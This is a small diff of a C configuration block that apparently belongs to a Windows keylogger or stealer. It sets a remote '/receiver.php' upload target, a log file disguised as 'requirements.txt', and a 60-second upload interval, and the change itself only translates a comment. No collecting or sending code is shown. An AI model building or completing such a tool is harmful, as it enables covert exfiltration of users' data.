@@ -17,7 +17,7 @@
 #pragma comment(lib, "advapi32.lib") 
 
 // --- KONFIGURATION  ---
-#define SERVER ""        // ONLY DOMENA (bez https://)
+#define SERVER ""        // ONLY DOMAIN (without https:// or http://)
 #define SCRIPT_PATH "/receiver.php"     // Path to PHP script
 #define LOG_FILE "requirements.txt"     // Local log name
 #define UPLOAD_INTERVAL 60              // Upload every 60 seconds
